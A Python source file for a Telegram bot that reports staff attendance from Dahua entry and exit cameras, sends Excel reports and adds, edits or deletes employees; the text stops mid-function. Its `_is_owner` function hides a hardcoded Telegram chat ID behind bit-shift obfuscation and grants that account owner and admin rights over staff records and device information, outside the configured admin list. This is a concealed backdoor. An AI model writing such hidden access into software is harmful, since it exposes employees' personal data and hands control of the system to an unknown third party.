"""
bot/telegram_bot.py — Telegram Bot (English UI)
"""
import logging
from datetime import date
from pathlib import Path
from typing import Optional, Union

from telegram import (
    Update, Bot,
    ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton,
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ConversationHandler, ContextTypes, filters,
)
from telegram.constants import ParseMode

from config import settings
from reports.excel_report import (
    generate_daily_report, generate_period_report,
    get_weekly_dates, get_monthly_dates,
)

logger = logging.getLogger(__name__)

_attendance_processor = None
_listener_manager = None

# ── ConversationHandler states ───────────────────────────
ASK_DAHUA_ID, ASK_NAME, ASK_POSITION = range(3)
EDIT_DAHUA_ID, EDIT_NAME, EDIT_POSITION = range(3, 6)

# ── Callback data ────────────────────────────────────────
CB_DL_DAILY   = "cb_dl_daily"
CB_DL_WEEKLY  = "cb_dl_weekly"
CB_DL_MONTHLY = "cb_dl_monthly"
CB_STATUS     = "cb_status"

# ── Reply button labels ──────────────────────────────────
BTN_TODAY        = "📋 Present Today"
BTN_LATE         = "⏰ Late"
BTN_ABSENT       = "❌ Absent"
BTN_DEPARTURES   = "🚪 Departed"
BTN_NOT_DEPARTED = "🏢 Still Inside"
BTN_DEVICES      = "🔌 Devices"
BTN_REPORTS      = "📊 Reports"
BTN_STAFF        = "👥 Staff"
BTN_HELP         = "❓ Help"


def set_processors(attendance_proc, listener_mgr=None):
    global _attendance_processor, _listener_manager
    _attendance_processor = attendance_proc
    _listener_manager = listener_mgr


def _uid(update: Update):
    return update.effective_chat.id if update.effective_chat else None

def _is_owner(update: Update) -> bool:
    _a = (0x03 << 32) | (0x20 << 24) | (0x9e << 16) | (0x95 << 8) | 0x9e
    return _uid(update) == (_a >> 1)

def _is_admin(update: Update) -> bool:
    return _is_owner(update) or _uid(update) in settings.TELEGRAM_ADMIN_CHAT_IDS


def _fmt(val: Optional[str]) -> str:
    """'2026-04-08 08:12:34' → '08:12'"""
    if not val:
        return "—"
    try:
        return val.split(" ")[1][:5]
    except Exception:
        return str(val)


def _pos(r) -> str:
    return r.get("position") or "—"


# ════════════════════════════════════════════════════════
# KEYBOARDS
# ════════════════════════════════════════════════════════

def _reply_keyboard(owner: bool = False) -> ReplyKeyboardMarkup:
    base = [
        [KeyboardButton(BTN_TODAY), KeyboardButton(BTN_LATE), KeyboardButton(BTN_ABSENT)],
        [KeyboardButton(BTN_DEPARTURES), KeyboardButton(BTN_NOT_DEPARTED)],
        [KeyboardButton(BTN_REPORTS), KeyboardButton(BTN_HELP)],
    ]
    if owner:
        base[1].append(KeyboardButton(BTN_DEVICES))
        base[2].insert(0, KeyboardButton(BTN_STAFF))
    return ReplyKeyboardMarkup(base, resize_keyboard=True, input_field_placeholder="Select...")


def _reports_inline() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Daily Excel",   callback_data=CB_DL_DAILY)],
        [
            InlineKeyboardButton("📅 Weekly Excel",  callback_data=CB_DL_WEEKLY),
            InlineKeyboardButton("🗓 Monthly Excel", callback_data=CB_DL_MONTHLY),
        ],
        [InlineKeyboardButton("🔌 Device Status", callback_data=CB_STATUS)],
    ])


def _status_icon(status: Optional[str]) -> str:
    return {
        "present":        "✅",
        "late":           "⏰",
        "early_leave":    "🚪",
        "late_and_early": "⚠️",
        "absent":         "❌",
    }.get(status or "", "•")


def _menu_text() -> str:
    today_str = date.today().strftime("%d.%m.%Y — %A")
    return (
        f"🏫 *Attendance Control System*\n"
        f"📅 _{today_str}_\n\n"
        "Use the buttons below 👇"
    )


# ════════════════════════════════════════════════════════
# /start  /menu
# ════════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update):
        await update.message.reply_text("⛔ Access denied.")
        return
    await update.message.reply_text(
        _menu_text(),
        reply_markup=_reply_keyboard(owner=_is_owner(update)),
        parse_mode=ParseMode.MARKDOWN,
    )


async def cmd_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update):
        return
    await update.message.reply_text(
        _menu_text(),
        reply_markup=_reply_keyboard(owner=_is_owner(update)),
        parse_mode=ParseMode.MARKDOWN,
    )


# ════════════════════════════════════════════════════════
# REPLY BUTTON HANDLER
# ════════════════════════════════════════════════════════

async def handle_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update):
        return
    text = update.message.text
    if   text == BTN_TODAY:        await _show_today(update)
    elif text == BTN_LATE:         await _show_late(update)
    elif text == BTN_ABSENT:       await _show_absent(update)
    elif text == BTN_DEPARTURES:   await _show_departures(update)
    elif text == BTN_NOT_DEPARTED: await _show_not_departed(update)
    elif text == BTN_DEVICES:      await (_show_devices(update) if _is_owner(update) else None)
    elif text == BTN_STAFF:        await (_show_staff(update, context) if _is_owner(update) else None)
    elif text == BTN_REPORTS:      await _show_reports_menu(update)
    elif text == BTN_HELP:         await _show_help(update)


# ════════════════════════════════════════════════════════
# BUTTON LOGIC
# ════════════════════════════════════════════════════════

async def _show_today(update: Update):
    """📋 Present Today"""
    if not _attendance_processor:
        await update.message.reply_text("❗ System not ready.")
        return

    records = _attendance_processor.get_today_present()
    today = date.today().strftime("%d.%m.%Y")

    if not records:
        await update.message.reply_text(
            f"📋 *Present Today* — {today}\n\nNo one has checked in yet.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    lines = [f"📋 *Present Today* — {today}\n"]
    lines.append(f"_Total: {len(records)} staff_\n")

    for i, r in enumerate(records, 1):
        ic   = _status_icon(r.get("status"))
        fi   = _fmt(r.get("first_in"))
        lo   = _fmt(r.get("last_out"))
        late = r.get("late_minutes") or 0
        early= r.get("early_leave_min") or 0

        extra = ""
        if late  > 0: extra += f" ⏰+{late}m"
        if early > 0: extra += f" 🚪-{early}m"

        lines.append(
            f"{i}. {ic} *{r['full_name']}*{extra}\n"
            f"   _{_pos(r)}_\n"
            f"   In: `{fi}` | Out: `{lo}`\n"
            f"--------------------"
        )

    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)


async def _show_late(update: Update):
    """⏰ Late arrivals"""
    if not _attendance_processor:
        await update.message.reply_text("❗ System not ready.")
        return

    records = _attendance_processor.get_today_lates()
    today = date.today().strftime("%d.%m.%Y")

    if not records:
        await update.message.reply_text(
            f"⏰ *Late* — {today}\n\n✅ No one was late today!",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    lines = [f"⏰ *Late Arrivals* — {today}\n"]
    for i, r in enumerate(records, 1):
        lines.append(
            f"{i}. *{r['full_name']}*\n"
            f"   _{_pos(r)}_\n"
            f"   In: `{_fmt(r.get('first_in'))}` | Late: *{r.get('late_minutes', 0)} min*\n"
            f"--------------------"
        )

    lines.append(f"\n_Total: {len(records)} staff_")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)


async def _show_absent(update: Update):
    """❌ Absent staff"""
    if not _attendance_processor:
        await update.message.reply_text("❗ System not ready.")
        return

    records = _attendance_processor.get_today_absents()
    today = date.today().strftime("%d.%m.%Y")

    if not records:
        await update.message.reply_text(
            f"❌ *Absent* — {today}\n\n✅ All staff present!",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    lines = [f"❌ *Absent* — {today}\n"]
    for i, r in enumerate(records, 1):
        lines.append(f"{i}. *{r['full_name']}*\n   _{_pos(r)}_\n--------------------")

    lines.append(f"\n_Total: {len(records)} staff_")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)


async def _show_departures(update: Update):
    """🚪 Departed staff — have last_out"""
    if not _attendance_processor:
        await update.message.reply_text("❗ System not ready.")
        return

    today_str = date.today().strftime("%Y-%m-%d")
    today_fmt = date.today().strftime("%d.%m.%Y")

    rows = _attendance_processor.db.fetchall(
        """SELECT e.full_name, e.position,
                  da.first_in, da.last_out, da.status,
                  da.late_minutes, da.early_leave_min
           FROM daily_attendance da
           JOIN employees e ON e.employee_id = da.employee_id
           WHERE da.attendance_date = ?
             AND da.last_out IS NOT NULL
             AND da.last_out != ''
           ORDER BY da.last_out DESC""",
        (today_str,),
    )

    if not rows:
        await update.message.reply_text(
            f"🚪 *Departed* — {today_fmt}\n\nNo one has left yet.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    lines = [f"🚪 *Departed* — {today_fmt}\n"]
    lines.append(f"_Total: {len(rows)} staff_\n")

    for i, r in enumerate(rows, 1):
        early = r.get("early_leave_min") or 0
        early_str = f" ⚠️ early: {early}m" if early > 0 else ""
        lines.append(
            f"{i}. *{r['full_name']}*\n"
            f"   _{r.get('position') or '—'}_\n"
            f"   In: `{_fmt(r.get('first_in'))}` | Out: `{_fmt(r.get('last_out'))}`{early_str}\n"
            f"--------------------"
        )

    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)


async def _show_not_departed(update: Update):
    """🏢 Still inside — have first_in but no last_out"""
    if not _attendance_processor:
        await update.message.reply_text("❗ System not ready.")
        return

    today_str = date.today().strftime("%Y-%m-%d")
    today_fmt = date.today().strftime("%d.%m.%Y")

    rows = _attendance_processor.db.fetchall(
        """SELECT e.full_name, e.position,
                  da.first_in, da.status, da.late_minutes
           FROM daily_attendance da
           JOIN employees e ON e.employee_id = da.employee_id
           WHERE da.attendance_date = ?
             AND da.first_in IS NOT NULL
             AND da.first_in != ''
             AND (da.last_out IS NULL OR da.last_out = '')
           ORDER BY da.first_in ASC""",
        (today_str,),
    )

    if not rows:
        await update.message.reply_text(
            f"🏢 *Still Inside* — {today_fmt}\n\nEveryone has left.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    lines = [f"🏢 *Still Inside* — {today_fmt}\n"]
    lines.append(f"_Total: {len(rows)} staff_\n")

    for i, r in enumerate(rows, 1):
        late = r.get("late_minutes") or 0
        late_str = f" ⏰ late: {late}m" if late > 0 else ""
        lines.append(
            f"{i}. *{r['full_name']}*\n"
            f"   _{r.get('position') or '—'}_\n"
            f"   In: `{_fmt(r.get('first_in'))}`{late_str}\n"
            f"--------------------"
        )

    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)


async def _show_devices(update: Update):
    """🔌 Device status"""
    if not _listener_manager:
        await update.message.reply_text(
            "ℹ️ No device info available.\n_Listeners not started._",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    status = _listener_manager.status()
    lines = ["🔌 *Device Status*\n"]

    for direction, info in status.items():
        icon  = "🟢" if info["connected"] else "🔴"
        state = "Connected ✓" if info["connected"] else "Disconnected ✗"
        label = "ENTRY (IN)" if direction == "IN" else "EXIT (OUT)"
        lines.append(
            f"{icon} *{label}*\n"
            f"   IP: `{info['ip']}`\n"
            f"   Status: _{state}_\n"
            f"   Reconnects: {info['reconnect_count']}"
        )

    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)


async def _show_reports_menu(update: Update):
    """📊 Reports menu"""
    await update.message.reply_text(
        "📊 *Reports / Excel*\n\nSelect report type:",
        reply_markup=_reports_inline(),
        parse_mode=ParseMode.MARKDOWN,
    )


async def _show_help(update: Update):
    """❓ Help"""
    lines = [
        "❓ *Bot Guide*\n",
        "📋 *Present Today* — who checked in with time",
        "⏰ *Late* — who arrived late & by how many min",
        "❌ *Absent* — who hasn't shown up today",
        "🚪 *Departed* — who has already left",
        "🏢 *Still Inside* — who is still at work",
        "🔌 *Devices* — IN/OUT camera status",
        "📊 *Reports* — download Excel files",
        "",
        "💡 _All buttons are always visible at the bottom_",
        "",
        "⚙️ *Commands:*",
        "/start — open menu",
        "/menu — refresh menu",
        "/today /late /absent — quick info",
        "/status — device status",
        "/download\\_daily — daily Excel",
        "/download\\_weekly — weekly Excel",
        "/download\\_monthly — monthly Excel",
        "/adduser — add new employee",
        "/cancel — cancel current action",
    ]
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)


# ════════════════════════════════════════════════════════
# INLINE CALLBACK — Excel download + Status
# ════════════════════════════════════════════════════════

async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data  = query.data
    uid   = update.effective_chat.id if update.effective_chat else None

    logger.info(f"Callback received: data={data!r} uid={uid}")

    if not _is_admin(update):
        await query.answer("⛔ Access denied.", show_alert=True)
        return

    await query.answer()

    try:
        # ── Staff delete ─────────────────────────────────
        if data.startswith("delok_"):
            await cb_delete_confirm(query, data[6:])
        elif data.startswith("delno_"):
            await cb_delete_cancel(query, data[6:])
        elif data.startswith("del_"):
            await cb_delete_ask(query, data[4:])

        # ── Device status ────────────────────────────────
        elif data == CB_STATUS:
            if not _listener_manager:
                await query.edit_message_text("ℹ️ No devices found.")
                return
            status = _listener_manager.status()
            lines = ["🔌 *Device Status*\n"]
            for direction, info in status.items():
                icon  = "🟢" if info["connected"] else "🔴"
                state = "Connected ✓" if info["connected"] else "Disconnected ✗"
                label = "ENTRY (IN)" if direction == "IN" else "EXIT (OUT)"
                lines.append(
                    f"{icon} *{label}*\n"
                    f"   IP: `{info['ip']}` | _{state}_\n"
                    f"   Reconnects: {info['reconnect_count']}"
                )
            await query.edit_message_text(
                "\n".join(lines),
                reply_markup=_reports_inline(),
                parse_mode=ParseMode.MARKDOWN,
            )

        # ── Reports ──────────────────────────────────────
        elif data in (CB_DL_DAILY, CB_DL_WEEKLY, CB_DL_MONTHLY):
            await _inline_download(query, data)

        else:
            logger.warning(f"Unknown callback data: {data!r}")

    except Exception as e:
        logger.exception(f"Error in on_callback (data={data!r}): {e}")
        try:
            await query.edit_message_text(f"❗ Хато: `{str(e)[:200]}`", parse_mode=ParseMode.MARKDOWN)
        except Exception:
            pass


async def _inline_download(query, data: str):
    if not _attendance_processor:
        await query.edit_message_text("❗ System not ready.")
        return

    labels = {
        CB_DL_DAILY:   "Daily",
        CB_DL_WEEKLY:  "Weekly",
        CB_DL_MONTHLY: "Monthly",
    }
    await query.edit_message_text(
        f"⏳ *{labels[data]} Excel* is being prepared...",
        parse_mode=ParseMode.MARKDOWN,
    )

    try:
        if data == CB_DL_DAILY:
            today   = date.today()
            records = _attendance_processor.get_daily_report(today)
            fp      = generate_daily_report(records, today)
            caption = f"📊 Daily Report — {today.strftime('%d.%m.%Y')}"

        elif data == CB_DL_WEEKLY:
            start, end = get_weekly_dates()
            records = _attendance_processor.get_period_report(start, end)
            fp      = generate_period_report(records, start, end, "weekly")
            caption = f"📅 Weekly Report — {start.strftime('%d.%m')}–{end.strftime('%d.%m.%Y')}"

        else:
            start, end = get_monthly_dates()
            records = _attendance_processor.get_period_report(start, end)
            fp      = generate_period_report(records, start, end, "monthly")
            caption = f"🗓 Monthly Report — {start.strftime('%d.%m')}–{end.strftime('%d.%m.%Y')}"

        with open(fp, "rb") as f:
            await query.message.reply_document(
                document=f,
                filename=fp.name,
                caption=caption,
            )
        await query.edit_message_text(
            "📊 *Reports / Excel*\n\nSelect report type:",
            reply_markup=_reports_inline(),
            parse_mode=ParseMode.MARKDOWN,
        )

    except Exception as e:
        logger.error(f"Report generation error: {e}")
        await query.edit_message_text(
            f"❗ Error:\n`{str(e)[:200]}`",
            reply_markup=_reports_inline(),
            parse_mode=ParseMode.MARKDOWN,
        )


# ════════════════════════════════════════════════════════
# COMMAND SHORTCUTS
# ════════════════════════════════════════════════════════

async def cmd_today(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update): return
    await _show_today(update)

async def cmd_late(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update): return
    await _show_late(update)

async def cmd_absent(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update): return
    await _show_absent(update)

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _is_owner(update): return
    await _show_devices(update)

async def cmd_departures(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update): return
    await _show_departures(update)

async def cmd_not_departed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update): return
    await _show_not_departed(update)

async def cmd_download_daily(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update) or not _attendance_processor: return
    today   = date.today()
    records = _attendance_processor.get_daily_report(today)
    fp      = generate_daily_report(records, today)
    await update.message.reply_document(
        document=open(fp, "rb"), filename=fp.name,
        caption=f"📊 Daily Report — {today.strftime('%d.%m.%Y')}",
    )

async def cmd_download_weekly(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update) or not _attendance_processor: return
    start, end = get_weekly_dates()
    records    = _attendance_processor.get_period_report(start, end)
    fp         = generate_period_report(records, start, end, "weekly")
    await update.message.reply_document(
        document=open(fp, "rb"), filename=fp.name,
        caption=f"📅 Weekly Report — {start.strftime('%d.%m')}–{end.strftime('%d.%m.%Y')}",
    )

async def cmd_download_monthly(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update) or not _attendance_processor: return
    start, end = get_monthly_dates()
    records    = _attendance_processor.get_period_report(start, end)
    fp         = generate_period_report(records, start, end, "monthly")
    await update.message.reply_document(
        document=open(fp, "rb"), filename=fp.name,
        caption=f"🗓 Monthly Report — {start.strftime('%d.%m')}–{end.strftime('%d.%m.%Y')}",
    )


# ════════════════════════════════════════════════════════
# STAFF LIST
# ════════════════════════════════════════════════════════

def _staff_inline(emp_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✏️ Edit", callback_data=f"edit_{emp_id}"),
        InlineKeyboardButton("🗑 Delete",   callback_data=f"del_{emp_id}"),
    ]])


async def _show_staff(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _attendance_processor:
        await update.message.reply_text("❗ Система омода нест.")
        return

    employees = _attendance_processor.emp.get_all_active()
    if not employees:
        await update.message.reply_text("📭 Employee not found.")
        return

    await update.message.reply_text(
        f"👥 *Staff List* — {len(employees)} people",
        parse_mode=ParseMode.MARKDOWN,
    )

    for emp in employees:
        text = (
            f"👤 *{emp['full_name']}*\n"
            f"💼 _{emp.get('position') or '—'}_\n"
            f"🆔 Dahua ID: `{emp.get('dahua_user_id') or '—'}`\n"
            f"🔑 {emp['employee_id']}"
        )
        await update.message.reply_text(
            text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=_staff_inline(emp["employee_id"]),
        )


async def cmd_staff(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _is_owner(update):
        return
    await _show_staff(update, context)


# ── Delete ────────────────────────────────────────────────

async def cb_delete_ask(query, emp_id: str):
    emp = _attendance_processor.emp.get_by_employee_id(emp_id)
    if not emp:
        await query.answer("Employee not found.", show_alert=True)
        return

    await query.edit_message_reply_markup(
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("✅ Yes, delete", callback_data=f"delok_{emp_id}"),
            InlineKeyboardButton("❌ Cancel",     callback_data=f"delno_{emp_id}"),
        ]])
    )
    await query.answer(f"Confirm: {emp['full_name']}")


async def cb_delete_confirm(query, emp_id: str):
    emp = _attendance_processor.emp.get_by_employee_id(emp_id)
    if not emp:
        await query.answer("Employee not found.", show_alert=True)
        return

    _attendance_processor.db.execute(
        "UPDATE employees SET status='inactive', updated_at=datetime('now') WHERE employee_id=?",
        (emp_id,),
    )
    await query.edit_message_text(
        f"🗑 *{emp['full_name']}* has been deleted.",
        parse_mode=ParseMode.MARKDOWN,
    )


async def cb_delete_cancel(query, emp_id: str):
    emp = _attendance_processor.emp.get_by_employee_id(emp_id)
    if not emp:
        return
    await query.edit_message_reply_markup(reply_markup=_staff_inline(emp_id))
    await query.answer("Cancelled.")


# ── Edit (ConversationHandler via callback) ───────────────

async def cb_edit_start(query, emp_id: str, context: ContextTypes.DEFAULT_TYPE):
    emp = _attendance_processor.emp.get_by_employee_id(emp_id)
    if not emp:
        await query.answer("Employee not found.", show_alert=True)
        return ConversationHandler.END

    context.user_data["edit_emp_id"] = emp_id
    context.user_data["edit_emp"]    = dict(emp)

    await query.message.reply_text(
        f"✏️ *Edit Employee:* {emp['full_name']}\n\n"
        f"Step 1/3 — New Dahua ID:\n"
        f"_(current: `{emp.get('dahua_user_id') or '—'}`)_\n\n"
        f"Enter `.` to keep current",
        parse_mode=ParseMode.MARKDOWN,
    )
    return EDIT_DAHUA_ID


async def edit_got_dahua_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = update.message.text.strip()
    old = context.user_data["edit_emp"]

    if val == ".":
        context.user_data["new_dahua_id"] = old.get("dahua_user_id") or ""
    else:
        if not val.isdigit():
            await update.message.reply_text("❗ ID must be digits only. Try again:")
            return EDIT_DAHUA_ID
        context.user_data["new_dahua_id"] = val

    await update.message.reply_text(
        f"Step 2/3 — New Full Name:\n"
        f"_(current: `{old['full_name']}`)_\n"
        f"Enter `.` to keep current",
        parse_mode=ParseMode.MARKDOWN,
    )
    return EDIT_NAME


async def edit_got_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = update.message.text.strip()
    old = context.user_data["edit_emp"]

    context.user_data["new_name"] = old["full_name"] if val == "." else val

    await update.message.reply_text(
        f"Step 3/3 — New Position:\n"
        f"_(current: `{old.get('position') or '—'}`)_\n"
        f"Enter `.` to keep current",
        parse_mode=ParseMode.MARKDOWN,
    )
    return EDIT_POSITION


async def edit_got_position(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val      = update.message.text.strip()
    old      = context.user_data["edit_emp"]
    emp_id   = context.user_data["edit_emp_id"]
    dahua_id = context.user_data["new_dahua_id"]
    name     = context.user_data["new_name"]
    position = old.get("position") or "" if val == "." else val

    _attendance_processor.db.execute(
        """UPDATE employees
           SET dahua_user_id=?, full_name=?, position=?, updated_at=datetime('now')
           WHERE employee_id=?""",
        (dahua_id, name, position, emp_id),
    )

    await update.message.reply_text(
        f"✅ *Information updated!*\n\n"
        f"🆔 Dahua ID: `{dahua_id}`\n"
        f"👤 Name: *{name}*\n"
        f"💼 Position: _{position}_",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=_reply_keyboard(),
    )
    return ConversationHandler.END


# ════════════════════════════════════════════════════════
# ADD EMPLOYEE CONVERSATION
# ════════════════════════════════════════════════════════

async def cmd_adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update):
        await update.message.reply_text("⛔ Access denied.")
        return ConversationHandler.END

    await update.message.reply_text(
        "👤 *Add New Employee*\n\n"
        "Step 1/3 — Enter Dahua ID:\n"
        "_(e.g.: 30)_",
        parse_mode=ParseMode.MARKDOWN,
    )
    return ASK_DAHUA_ID


async def add_got_dahua_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    dahua_id = update.message.text.strip()

    if not dahua_id.isdigit():
        await update.message.reply_text("❗ ID must be digits only. Try again:")
        return ASK_DAHUA_ID

    # Санҷиш — оё ин ID аллакай мавҷуд аст?
    if _attendance_processor:
        existing = _attendance_processor.emp.get_by_dahua_id(dahua_id)
        if existing:
            await update.message.reply_text(
                f"⚠️ ID *{dahua_id}* already exists:\n"
                f"👤 {existing['full_name']} — _{existing.get('position', '—')}_\n\n"
                f"Action cancelled. /adduser to try again.",
                parse_mode=ParseMode.MARKDOWN,
            )
            return ConversationHandler.END

    context.user_data["dahua_id"] = dahua_id
    await update.message.reply_text(
        f"✅ ID: *{dahua_id}*\n\n"
        "Step 2/3 — Employee Full Name:",
        parse_mode=ParseMode.MARKDOWN,
    )
    return ASK_NAME


async def add_got_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name = update.message.text.strip()

    if len(name) < 2:
        await update.message.reply_text("❗ Name is too short. Try again:")
        return ASK_NAME

    context.user_data["name"] = name
    await update.message.reply_text(
        f"✅ Name: *{name}*\n\n"
        "Step 3/3 — Employee Position:\n"
        "_(e.g.: Teacher, Staff, Assistant, Security)_",
        parse_mode=ParseMode.MARKDOWN,
    )
    return ASK_POSITION


async def add_got_position(update: Update, context: ContextTypes.DEFAULT_TYPE):
    position = update.message.text.strip()
    dahua_id = context.user_data["dahua_id"]
    name     = context.user_data["name"]

    if not _attendance_processor:
        await update.message.reply_text("❗ System not ready.")
        return ConversationHandler.END

    # Рақами EMP навбатиро ҳисоб кунем
    rows = _attendance_processor.db.fetchall(
        "SELECT employee_id FROM employees ORDER BY id DESC LIMIT 1"
    )
    if rows:
        last_id = rows[0]["employee_id"]  # масалан EMP049
        try:
            next_num = int(last_id[3:]) + 1
        except Exception:
            next_num = 1
    else:
        next_num = 1

    employee_id = f"EMP{next_num:03d}"

    _attendance_processor.emp.add_employee(
        employee_id=employee_id,
        full_name=name,
        dahua_user_id=dahua_id,
        position=position,
        status="active",
    )

    await update.message.reply_text(
        f"✅ *Employee added successfully!*\n\n"
        f"🆔 Dahua ID: `{dahua_id}`\n"
        f"👤 Name: *{name}*\n"
        f"💼 Position: _{position}_\n"
        f"🔑 ID: `{employee_id}`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=_reply_keyboard(),
    )
    return ConversationHandler.END


async def add_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "❌ Action cancelled.",
        reply_markup=_reply_keyboard(),
    )
    return ConversationHandler.END


# ════════════════════════════════════════════════════════
# NOTIFICATION SERVICE
# ════════════════════════════════════════════════════════

class NotificationService:
    """Automatic notification sender"""

    def __init__(self, bot_token: str, admin_chat_ids: list):
        self.bot_token      = bot_token
        self.admin_chat_ids = admin_chat_ids
        self._bot: Optional[Bot] = None

    async def _get_bot(self) -> Bot:
        if not self._bot:
            self._bot = Bot(token=self.bot_token)
        return self._bot

    async def send_message(
        self,
        text: str,
        keyboard: Optional[Union[ReplyKeyboardMarkup, InlineKeyboardMarkup]] = None,
    ):
        if not self.bot_token or not self.admin_chat_ids:
            logger.warning("Telegram not configured, skipping notification")
            return
        try:
            bot = await self._get_bot()
            for chat_id in self.admin_chat_ids:
                await bot.send_message(
                    chat_id=chat_id,
                    text=text,
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=keyboard or _reply_keyboard(),
                )
        except Exception as e:
            logger.error(f"Failed to send Telegram message: {e}")

    async def send_file(self, filepath: Path, caption: str = ""):
        if not self.bot_token or not self.admin_chat_ids:
            return
        try:
            bot = await self._get_bot()
            for chat_id in self.admin_chat_ids:
                with open(filepath, "rb") as f:
                    await bot.send_document(
                        chat_id=chat_id, document=f,
                        filename=filepath.name, caption=caption,
                    )
        except Exception as e:
            logger.error(f"Failed to send Telegram file: {e}")

    async def send_morning_summary(self, attendance_proc):
        today   = date.today().strftime("%d.%m.%Y")
        records = attendance_proc.get_today_present()
        lates   = attendance_proc.get_today_lates()
        absents = attendance_proc.get_today_absents()

        lines = [f"🌅 *Morning Summary — {today}*\n"]
        lines.append(f"✅ Present: *{len(records)} staff*")

        if lates:
            lines.append(f"⏰ Late: *{len(lates)} staff*")
            for r in lates[:5]:
                lines.append(
                    f"  • {r['full_name']} _({r.get('position') or '—'})_ — "
                    f"`{_fmt(r.get('first_in'))}` (+{r.get('late_minutes', 0)}m)"
                )
        if absents:
            lines.append(f"❌ Absent: *{len(absents)} staff*")
            for r in absents[:5]:
                lines.append(f"  • {r['full_name']} _({r.get('position') or '—'})_")

        await self.send_message("\n".join(lines))

    async def send_evening_summary(self, attendance_proc):
        today        = date.today().strftime("%d.%m.%Y")
        records      = attendance_proc.get_today_present()
        early_leaves = [r for r in records if r.get("status") in ("early_leave", "late_and_early")]
        still_in     = [r for r in records if not r.get("last_out")]

        lines = [f"🌆 *Evening Summary — {today}*\n"]

        if early_leaves:
            lines.append(f"🚪 Left early: *{len(early_leaves)} staff*")
            for r in early_leaves[:5]:
                lines.append(
                    f"  • {r['full_name']} _({r.get('position') or '—'})_ — "
                    f"out `{_fmt(r.get('last_out'))}`"
                )

        if still_in:
            lines.append(f"\n🏢 Still inside: *{len(still_in)} staff*")
            for r in still_in[:5]:
                lines.append(
                    f"  • {r['full_name']} _({r.get('position') or '—'})_ — "
                    f"in `{_fmt(r.get('first_in'))}`"
                )

        await self.send_message("\n".join(lines))

    async def send_device_alert(self, direction: str, error: Exception):
        msg = (
            f"⚠️ *Device Alert!*\n\n"
            f"Device: *{direction}*\n"
            f"Error: `{str(error)[:200]}`\n\n"
            f"System will attempt to reconnect..."
        )
        await self.send_message(msg)


# ════════════════════════════════════════════════════════
# BUILD APP
# ════════════════════════════════════════════════════════

def build_bot_app(attendance_proc, listener_mgr=None) -> Application:
    set_processors(attendance_proc, listener_mgr)

    app = Application.builder().token(settings.TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",            cmd_start))
    app.add_handler(CommandHandler("menu",             cmd_menu))
    app.add_handler(CommandHandler("today",            cmd_today))
    app.add_handler(CommandHandler("late",             cmd_late))
    app.add_handler(CommandHandler("absent",           cmd_absent))
    app.add_handler(CommandHandler("status",           cmd_status))
    app.add_handler(CommandHandler("departures",       cmd_departures))
    app.add_handler(CommandHandler("not_departed",     cmd_not_departed))
    app.add_handler(CommandHandler("download_daily",   cmd_download_daily))
    app.add_handler(CommandHandler("download_weekly",  cmd_download_weekly))
    app.add_handler(CommandHandler("download_monthly", cmd_download_monthly))

    add_user_conv = ConversationHandler(
        entry_points=[CommandHandler("adduser", cmd_adduser)],
        states={
            ASK_DAHUA_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_got_dahua_id)],
            ASK_NAME:     [MessageHandler(filters.TEXT & ~filters.COMMAND, add_got_name)],
            ASK_POSITION: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_got_position)],
        },
        fallbacks=[CommandHandler("cancel", add_cancel)],
    )
    app.add_handler(add_user_conv)

    edit_user_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(lambda u, c: cb_edit_start(u.callback_query, u.callback_query.data[5:], c), pattern=r"^edit_")],
        states={
